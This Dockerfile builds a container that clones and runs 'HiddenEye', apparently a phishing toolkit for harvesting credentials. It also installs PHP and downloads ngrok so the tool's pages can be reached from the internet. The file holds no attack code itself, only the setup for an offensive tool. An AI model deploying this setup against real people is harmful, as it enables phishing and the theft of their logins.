FROM python
MAINTAINER mcbplay1@gmail.com
RUN apt-get update -y ; apt-get upgrade -y ; apt-get install sudo apt-transport-https lsb-release ca-certificates wget -y
RUN wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg ; echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/php.list ; apt-get update -y ; apt-get install php7.2 -y
WORKDIR /root
RUN git clone https://github.com/DarkSecDevelopers/HiddenEye.git
WORKDIR /root/HiddenEye
RUN pip install --upgrade pip
RUN pip3 install -r requirements.txt
RUN chmod +x HiddenEye.py
RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip ; unzip ngrok.zip ; rm -r ngrok.zip ; mv ngrok Server/ngrok
RUN ln -s /root/HiddenEye/HiddenEye.py /bin/HiddenEye
ENTRYPOINT ["python3", "/root/HiddenEye/HiddenEye.py"]
